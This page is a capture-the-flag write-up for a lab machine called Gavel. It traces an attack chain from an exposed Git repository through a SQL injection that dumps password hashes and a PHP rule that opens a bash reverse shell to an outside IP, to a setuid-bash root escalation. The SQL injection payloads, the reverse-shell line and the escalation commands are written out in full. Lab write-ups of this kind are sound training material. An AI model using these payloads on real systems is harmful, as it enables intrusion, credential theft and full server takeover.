@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Gavel - CTF | 1xTP</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Gavel - CTF | 1xTrashPanda</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Gavel - CTF" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Exploiting an exposed Git repository, SQL injection, and dynamic rule execution to obtain root access" />
+<meta property="og:description" content="Exploiting an exposed Git repository, SQL injection, and dynamic rule execution to obtain root access" />
+<link rel="canonical" href="http://0.0.0.0:4000/writeups/Gavel/" />
+<meta property="og:url" content="http://0.0.0.0:4000/writeups/Gavel/" />
+<meta property="og:site_name" content="1xTrashPanda" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-03-15T00:00:00-07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Gavel - CTF" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-03-15T00:00:00-07:00","datePublished":"2026-03-15T00:00:00-07:00","description":"Exploiting an exposed Git repository, SQL injection, and dynamic rule execution to obtain root access","headline":"Gavel - CTF","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/writeups/Gavel/"},"url":"http://0.0.0.0:4000/writeups/Gavel/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-left">
+            <a href="/index.html"><h2>1xTP</h2></a>
+        </div>
+        <div class="nav-right">
+            <a href="/about.html">About</a>
+            <a href="/categories.html">Categories</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <aside class="profile-card" id="profileCard">
+            <div class="sidebar-toggle" id="sidebarToggle">
+                <i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="profile-img">
+                <img src="/assets/raccoon-pfp.png" alt="1xTrashPanda" class="profile-pic">
+            </div>
+            
+            <div class="profile-info-container">
+                <div class="profile-nb-container">
+                    <div class="profile-username">
+                        <h3>1xTrashPanda</h3>
+                    </div>
+                    <p class="profile-bio">
+                        Focus: <span class="accent">Offensive Security</span><br>
+                        Specialty: <span class="accent">WebApps & AD</span>
+                    </p>
+                </div>
+
+                <div class="profile-links">
+                    <a href="https://github.com/1xTP" target="_blank">
+                        <i class="fab fa-github"></i> Github
+                    </a>
+                </div>
+            </div>
+        </aside>
+
+        <main class="web-content-container">
+            <article class="report-body">
+
+    <section class="report-section">
+        <h2>1. Overview</h2>
+        <p>This challenge involved exploiting multiple issues in a custom auction platform. An exposed <code>.git</code> repository revealed the application source code, which contained a SQL injection vulnerability in the inventory functionality. This vulnerability allowed database queries to be manipulated and user password hashes to be extracted. After cracking the credentials for an admin account, it was possible to abuse the application's rule system to execute commands on the server and gain a shell. Further enumeration revealed a custom utility that processed auction submissions, which could be manipulated to bypass PHP restrictions and ultimately gain root access.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>2. Recon</h2>
+        <p>I began by running a standard Nmap scan to find open ports and services.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">└─<span class="nv">$ </span>nmap <span class="nt">-sCV</span> 10.129.242.203 <span class="nt">--min-rate</span> 5000 
+Starting Nmap 7.98 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-03-15 11:00 <span class="nt">-0400</span>
+Nmap scan report <span class="k">for </span>10.129.242.203
+Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to http://gavel.htb/
+Service Info: Host: gavel.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.94 seconds
+        </code></pre></figure>
+
+        <p>The scan found two open ports:</p>
+        <ul>
+            <li><b>22 (SSH)</b></li>
+            <li><b>80 (HTTP)</b></li>
+        </ul>
+
+        <p>The HTTP service redirected to the domain <code>gavel.htb</code>, so I added that domain to my hosts file. After doing that, I ran another Nmap scan specifically against port 80 to gather more information about the web server.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">└─<span class="nv">$ </span>nmap <span class="nt">-sCV</span> <span class="nt">-p</span> 80 10.129.242.203
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Gavel Auction
+|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-git: 
+|   10.129.242.203:80/.git/
+|     Git repository found!
+|     .git/config matched patterns <span class="s1">'user'</span>
+|     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">'description'</span> to name the...
+|_    Last commit message: .. 
+        </code></pre></figure>
+
+        <p>This scan found that the web server had an exposed <code>.git</code> repository.</p>
+        
+        <p>To retrieve the contents of the repository, I used <b>git-dumper</b>.</p>
+        
+        <p>After downloading the repository, I began reviewing the application source code. While reading the <code>inventory.php</code> file, I found code that appeared vulnerable to SQL injection.</p>
+
+        <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nv">$sortItem</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'sort'</span><span class="p">]</span> <span class="o">??</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'sort'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">'item_name'</span><span class="p">;</span>
+<span class="nv">$userId</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]</span> <span class="o">??</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]</span> <span class="o">??</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user'</span><span class="p">][</span><span class="s1">'id'</span><span class="p">];</span>
+<span class="nv">$col</span> <span class="o">=</span> <span class="s2">"`"</span> <span class="mf">.</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"`"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$sortItem</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"`"</span><span class="p">;</span>
+<span class="nv">$itemMap</span> <span class="o">=</span> <span class="p">[];</span>
+<span class="nv">$itemMeta</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s2">"SELECT name, description, image FROM items WHERE name = ?"</span><span class="p">);</span>
+<span class="k">try</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$sortItem</span> <span class="o">===</span> <span class="s1">'quantity'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s2">"SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC"</span><span class="p">);</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">([</span><span class="nv">$userId</span><span class="p">]);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s2">"SELECT </span><span class="nv">$col</span><span class="s2"> FROM inventory WHERE user_id = ? ORDER BY item_name ASC"</span><span class="p">);</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">([</span><span class="nv">$userId</span><span class="p">]);</span>
+    <span class="p">}</span>
+    <span class="nv">$results</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">fetchAll</span><span class="p">(</span><span class="no">PDO</span><span class="o">::</span><span class="no">FETCH_ASSOC</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$results</span> <span class="o">=</span> <span class="p">[];</span>
+<span class="p">}</span>
+<span class="mf">...</span><span class="p">[</span><span class="no">SNIP</span><span class="p">]</span><span class="mf">...</span>
+        </code></pre></figure>
+
+        <p>The way the <code>$col</code> variable was constructed allowed user input to modify the SQL query, making it possible to inject custom SQL.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>3. Foothold</h2>
+        <p>Since the vulnerability existed on the inventory page, I created an account and logged into the application. After going to the inventory page, I intercepted the request using <b>Burp Suite</b>.</p>
+
+        <p>The page normally used a GET request, so I converted it into a POST request to make testing easier. With the request template ready, I began testing SQL injection payloads.</p>
+
+        <p>After a while I found this payload which successfully returned some system information.</p>
+
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">user_id=x`+FROM+(SELECT+version()+AS+`'x`)s%3b&amp;sort=\?--+-%00
+        </code></pre></figure>
+
+        <p>Next, I tried to get usernames and password hashes from the database.</p>
+
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">user_id=x`+FROM+(SELECT+concat(username,0x3a,password)+AS+`'x`+FROM+users)s%3b&amp;sort=\?--+-%00
+        </code></pre></figure>
+
+        <p>This returned a few username and password hash combos from the <code>users</code> table.</p>
+
+        <p>With the hashes extracted, I put them through <b>Hashcat</b> to try cracking them. Hashcat recovered the password <code>midnight1</code> for the <code>auctioneer</code> account.</p>
+
+        <p>Logging into the application with this account provided access to an <b>admin panel</b> where auction rules and messages could be configured.</p>
+
+        <p>While reviewing the source code again, I found two files that were relevant to how the rule system worked:</p>
+        <ul>
+            <li><code>rules/default.yaml</code></li>
+            <li><code>bid_management.php</code></li>
+        </ul>
+
+        <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="c1"># bid_management.php</span>
+<span class="mf">...</span><span class="p">[</span><span class="no">SNIP</span><span class="p">]</span><span class="mf">...</span>
+<span class="k">try</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'ruleCheck'</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nf">runkit_function_remove</span><span class="p">(</span><span class="s1">'ruleCheck'</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nf">runkit_function_add</span><span class="p">(</span><span class="s1">'ruleCheck'</span><span class="p">,</span> <span class="s1">'$current_bid, $previous_bid, $bidder'</span><span class="p">,</span> <span class="nv">$rule</span><span class="p">);</span>
+    <span class="nb">error_log</span><span class="p">(</span><span class="s2">"Rule: "</span> <span class="mf">.</span> <span class="nv">$rule</span><span class="p">);</span>
+    <span class="nv">$allowed</span> <span class="o">=</span> <span class="nf">ruleCheck</span><span class="p">(</span><span class="nv">$current_bid</span><span class="p">,</span> <span class="nv">$previous_bid</span><span class="p">,</span> <span class="nv">$bidder</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">Throwable</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">error_log</span><span class="p">(</span><span class="s2">"Rule error: "</span> <span class="mf">.</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">());</span>
+    <span class="nv">$allowed</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$allowed</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">([</span><span class="s1">'success'</span> <span class="o">=&gt;</span> <span class="kc">false</span><span class="p">,</span> <span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="nv">$rule_message</span><span class="p">]);</span>
+    <span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="mf">...</span><span class="p">[</span><span class="no">SNIP</span><span class="p">]</span><span class="mf">...</span>
+        </code></pre></figure>
+
+        <figure class="highlight"><pre><code class="language-yaml" data-lang="yaml"><span class="c1"># rules/default.yaml</span>
+<span class="na">rules</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s2">"</span><span class="s">return</span><span class="nv"> </span><span class="s">$current_bid</span><span class="nv"> </span><span class="s">&gt;=</span><span class="nv"> </span><span class="s">$previous_bid</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">1.1;"</span>
+    <span class="na">message</span><span class="pi">:</span> <span class="s2">"</span><span class="s">Bid</span><span class="nv"> </span><span class="s">at</span><span class="nv"> </span><span class="s">least</span><span class="nv"> </span><span class="s">10%</span><span class="nv"> </span><span class="s">more</span><span class="nv"> </span><span class="s">than</span><span class="nv"> </span><span class="s">the</span><span class="nv"> </span><span class="s">current</span><span class="nv"> </span><span class="s">price."</span>
+
+  <span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s2">"</span><span class="s">return</span><span class="nv"> </span><span class="s">$current_bid</span><span class="nv"> </span><span class="s">%</span><span class="nv"> </span><span class="s">5</span><span class="nv"> </span><span class="s">==</span><span class="nv"> </span><span class="s">0;"</span>
+    <span class="na">message</span><span class="pi">:</span> <span class="s2">"</span><span class="s">Bids</span><span class="nv"> </span><span class="s">must</span><span class="nv"> </span><span class="s">be</span><span class="nv"> </span><span class="s">in</span><span class="nv"> </span><span class="s">multiples</span><span class="nv"> </span><span class="s">of</span><span class="nv"> </span><span class="s">5.</span><span class="nv"> </span><span class="s">Your</span><span class="nv"> </span><span class="s">account</span><span class="nv"> </span><span class="s">balance</span><span class="nv"> </span><span class="s">must</span><span class="nv"> </span><span class="s">cover</span><span class="nv"> </span><span class="s">the</span><span class="nv"> </span><span class="s">bid</span><span class="nv"> </span><span class="s">amount."</span>
+
+  <span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s2">"</span><span class="s">return</span><span class="nv"> </span><span class="s">$current_bid</span><span class="nv"> </span><span class="s">&gt;=</span><span class="nv"> </span><span class="s">$previous_bid</span><span class="nv"> </span><span class="s">+</span><span class="nv"> </span><span class="s">5000;"</span>
+    <span class="na">message</span><span class="pi">:</span> <span class="s2">"</span><span class="s">Only</span><span class="nv"> </span><span class="s">bids</span><span class="nv"> </span><span class="s">greater</span><span class="nv"> </span><span class="s">than</span><span class="nv"> </span><span class="s">5000</span><span class="nv"> </span><span class="s">+</span><span class="nv"> </span><span class="s">current</span><span class="nv"> </span><span class="s">bid</span><span class="nv"> </span><span class="s">will</span><span class="nv"> </span><span class="s">be</span><span class="nv"> </span><span class="s">considered.</span><span class="nv"> </span><span class="s">Ensure</span><span class="nv"> </span><span class="s">you</span><span class="nv"> </span><span class="s">have</span><span class="nv"> </span><span class="s">sufficient</span><span class="nv"> </span><span class="s">balance</span><span class="nv"> </span><span class="s">before</span><span class="nv"> </span><span class="s">placing</span><span class="nv"> </span><span class="s">such</span><span class="nv"> </span><span class="s">bids."</span>
+        </code></pre></figure>
+
+        <p>The rule system dynamically executed PHP code. Because of this, it was possible to insert custom code that would run on the server.</p>
+
+        <p>I tested this by inserting a rule via the admin panel that created a reverse shell, after setting up a netcat listener on my machine.</p>
+
+        <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nb">system</span><span class="p">(</span><span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.253/9001 0&gt;&amp;1"'</span><span class="p">);</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+        </code></pre></figure>
+
+        <p>Once the rule was triggered, by bidding on the item with the rule, I received a shell as the <code>www-data</code> user.</p>
+
+        <p>After gaining access, I checked the <code>/home</code> directory and found the <code>auctioneer</code> user account. Since I already had the password from the earlier hash cracking step, I tested whether it was reused for the system account. The password worked, allowing shell access as <code>auctioneer</code>.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>4. Root</h2>
+        <p>After logging in as <code>auctioneer</code>, I started standard enumeration steps. Running <code>sudo -l</code> did not reveal any usable privileges.</p>
+
+        <p>Next, I checked the <code>/opt</code> directory and found a folder named <code>gavel</code> that contained a sample submission file.</p>
+
+        <figure class="highlight"><pre><code class="language-yaml" data-lang="yaml"><span class="s">auctioneer@gavel:/opt/gavel$ cat sample.yaml</span> 
+<span class="nn">---</span>
+<span class="na">item</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s2">"</span><span class="s">Dragon's</span><span class="nv"> </span><span class="s">Feathered</span><span class="nv"> </span><span class="s">Hat"</span>
+  <span class="na">description</span><span class="pi">:</span> <span class="s2">"</span><span class="s">A</span><span class="nv"> </span><span class="s">flamboyant</span><span class="nv"> </span><span class="s">hat</span><span class="nv"> </span><span class="s">rumored</span><span class="nv"> </span><span class="s">to</span><span class="nv"> </span><span class="s">make</span><span class="nv"> </span><span class="s">dragons</span><span class="nv"> </span><span class="s">jealous."</span>
+  <span class="na">image</span><span class="pi">:</span> <span class="s2">"</span><span class="s">https://example.com/dragon_hat.png"</span>
+  <span class="na">price</span><span class="pi">:</span> <span class="m">10000</span>
+  <span class="na">rule_msg</span><span class="pi">:</span> <span class="s2">"</span><span class="s">Your</span><span class="nv"> </span><span class="s">bid</span><span class="nv"> </span><span class="s">must</span><span class="nv"> </span><span class="s">be</span><span class="nv"> </span><span class="s">at</span><span class="nv"> </span><span class="s">least</span><span class="nv"> </span><span class="s">20%</span><span class="nv"> </span><span class="s">higher</span><span class="nv"> </span><span class="s">than</span><span class="nv"> </span><span class="s">the</span><span class="nv"> </span><span class="s">previous</span><span class="nv"> </span><span class="s">bid</span><span class="nv"> </span><span class="s">and</span><span class="nv"> </span><span class="s">sado</span><span class="nv"> </span><span class="s">isn't</span><span class="nv"> </span><span class="s">allowed</span><span class="nv"> </span><span class="s">to</span><span class="nv"> </span><span class="s">buy</span><span class="nv"> </span><span class="s">this</span><span class="nv"> </span><span class="s">item."</span>
+  <span class="na">rule</span><span class="pi">:</span> <span class="s2">"</span><span class="s">return</span><span class="nv"> </span><span class="s">($current_bid</span><span class="nv"> </span><span class="s">&gt;=</span><span class="nv"> </span><span class="s">$previous_bid</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">1.2)</span><span class="nv"> </span><span class="s">&amp;&amp;</span><span class="nv"> </span><span class="s">($bidder</span><span class="nv"> </span><span class="s">!=</span><span class="nv"> </span><span class="s">'sado');"</span>
+        </code></pre></figure>
+
+        <p>This caught my attention because it used the same rule system that had already been exploited earlier.</p>
+
+        <p>Inside the same directory was a <code>.config</code> folder containing a custom PHP configuration file.</p>
+
+        <figure class="highlight"><pre><code class="language-ini" data-lang="ini"><span class="na">auctioneer@gavel:/opt/gavel$</span><span class="w"> </span><span class="na">cat</span><span class="w"> </span><span class="na">.config/php/php.ini</span><span class="w"> 
+</span><span class="py">engine</span><span class="p">=</span><span class="s">On</span>
+<span class="py">display_errors</span><span class="p">=</span><span class="s">On</span>
+<span class="py">display_startup_errors</span><span class="p">=</span><span class="s">On</span>
+<span class="py">log_errors</span><span class="p">=</span><span class="s">Off</span>
+<span class="py">error_reporting</span><span class="p">=</span><span class="s">E_ALL</span>
+<span class="py">open_basedir</span><span class="p">=</span><span class="s">/opt/gavel</span>
+<span class="py">memory_limit</span><span class="p">=</span><span class="s">32M</span>
+<span class="py">max_execution_time</span><span class="p">=</span><span class="s">3</span>
+<span class="py">max_input_time</span><span class="p">=</span><span class="s">10</span>
+<span class="py">disable_functions</span><span class="p">=</span><span class="s">exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client</span>
+<span class="py">scan_dir</span><span class="p">=</span>
+<span class="py">allow_url_fopen</span><span class="p">=</span><span class="s">Off</span>
+<span class="py">allow_url_include</span><span class="p">=</span><span class="s">Off</span>
+<span class="w">        </span></code></pre></figure>
+
+        <p>The config disabled many functions that would normally allow command execution.</p>
+
+        <p>To find more attack paths, I checked which groups the <code>auctioneer</code> user belonged to and found it was part of the <code>gavel-seller</code> group.</p>
+
+        <p>I then searched for files owned by this group.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">auctioneer@gavel:~<span class="nv">$ </span>find / <span class="nt">-group</span> gavel-seller 2&gt;/dev/null
+/run/gaveld.sock
+/usr/local/bin/gavel-util
+        </code></pre></figure>
+
+        <p>The binary <code>/usr/local/bin/gavel-util</code> seemed to handle auction submissions. Since I could not easily read it on the target machine, I copied it to my own system and read it using <b>Ghidra</b>.</p>
+
+        <p>I found one important detail:</p>
+        <ol>
+            <li>The <code>RULE_PATH</code> environment variable could be controlled by the user.</li>
+        </ol>
+
+        <p>Using this information, I copied both the sample YAML file and the PHP config file to <code>/tmp</code>. I modified the config file to remove the <code>disable_functions</code> restrictions.</p>
+
+        <p>Then I edited the sample YAML file to include the exploited rule.</p>
+
+        <figure class="highlight"><pre><code class="language-yaml" data-lang="yaml"><span class="s">auctioneer@gavel:/usr/local/bin$ cat /tmp/sample.yaml</span> 
+<span class="nn">---</span>
+<span class="na">name</span><span class="pi">:</span> <span class="s2">"</span><span class="s">Dragon's</span><span class="nv"> </span><span class="s">Feathered</span><span class="nv"> </span><span class="s">Hat"</span>
+<span class="na">description</span><span class="pi">:</span> <span class="s2">"</span><span class="s">A</span><span class="nv"> </span><span class="s">flamboyant</span><span class="nv"> </span><span class="s">hat</span><span class="nv"> </span><span class="s">rumored</span><span class="nv"> </span><span class="s">to</span><span class="nv"> </span><span class="s">make</span><span class="nv"> </span><span class="s">dragons</span><span class="nv"> </span><span class="s">jealous."</span>
+<span class="na">image</span><span class="pi">:</span> <span class="s2">"</span><span class="s">https://example.com/dragon_hat.png"</span>
+<span class="na">price</span><span class="pi">:</span> <span class="m">10000</span>
+<span class="na">rule_msg</span><span class="pi">:</span> <span class="s2">"</span><span class="s">Your</span><span class="nv"> </span><span class="s">bid</span><span class="nv"> </span><span class="s">must</span><span class="nv"> </span><span class="s">be</span><span class="nv"> </span><span class="s">at</span><span class="nv"> </span><span class="s">least</span><span class="nv"> </span><span class="s">20%</span><span class="nv"> </span><span class="s">higher</span><span class="nv"> </span><span class="s">than</span><span class="nv"> </span><span class="s">the</span><span class="nv"> </span><span class="s">previous</span><span class="nv"> </span><span class="s">bid</span><span class="nv"> </span><span class="s">and</span><span class="nv"> </span><span class="s">sado</span><span class="nv"> </span><span class="s">isn't</span><span class="nv"> </span><span class="s">allowed</span><span class="nv"> </span><span class="s">to</span><span class="nv"> </span><span class="s">buy</span><span class="nv"> </span><span class="s">this</span><span class="nv"> </span><span class="s">item."</span>
+<span class="na">rule</span><span class="pi">:</span> <span class="s2">"</span><span class="s">system('cp</span><span class="nv"> </span><span class="s">/bin/bash</span><span class="nv"> </span><span class="s">/home/bash;</span><span class="nv"> </span><span class="s">chmod</span><span class="nv"> </span><span class="s">4775</span><span class="nv"> </span><span class="s">/home/bash');</span><span class="nv"> </span><span class="s">return</span><span class="nv"> </span><span class="s">true;"</span>
+        </code></pre></figure>
+
+        <p>This rule created a <b>setuid bash binary</b>.</p>
+
+        <p>After preparing both files, I used the following commands.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">auctioneer@gavel:/usr/local/bin<span class="nv">$ RULE_PATH</span><span class="o">=</span>/dev/shm/php.ini gavel-util submit /dev/shm/sample.yaml 
+Item submitted <span class="k">for </span>review <span class="k">in </span>next auction
+auctioneer@gavel:/usr/local/bin<span class="nv">$ </span>/home/bash <span class="nt">-p</span>
+bash-5.1#
+        </code></pre></figure>
+
+        <p>Running the modified binary dropped me into a root shell.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>5. Conclusion</h2>
+        <p>Initial access to the application was obtained through an exposed Git repository on the web server. Reviewing the source code revealed a SQL injection vulnerability that allowed database queries to be manipulated and password hashes to be extracted. After cracking the credentials for the <code>auctioneer</code> account, administrative access to the auction platform was obtained.</p>
+
+        <p>From the admin panel, it was possible to abuse the rule system to execute PHP code on the server and obtain a shell as the <code>www-data</code> user. The same credentials were reused for the system account, allowing SSH access as <code>auctioneer</code>.</p>
+        
+        <p>Further investigation uncovered a custom submission utility that processed auction items. By modifying the PHP configuration and submission rules, it was possible to bypass function restrictions and create a setuid bash binary, which ultimately provided root access to the machine.</p>
+    </section>
+
+    <footer class="report-footer">
+        --- [END OF PAGE] ---
+    </footer>
+
+</article>
+        </main>
+    </div>
+    <script>
+        const toggleBtn = document.getElementById('sidebarToggle');
+        const sidebar = document.querySelector('.profile-card');
+        const overlay = document.getElementById('mobileOverlay');
+
+        function toggleSidebar() {
+            sidebar.classList.toggle('active');
+            overlay.classList.toggle('active');
+        }
+
+        toggleBtn.addEventListener('click', toggleSidebar);
+
+        overlay.addEventListener('click', toggleSidebar);
+    </script>
+</body>
+</html>
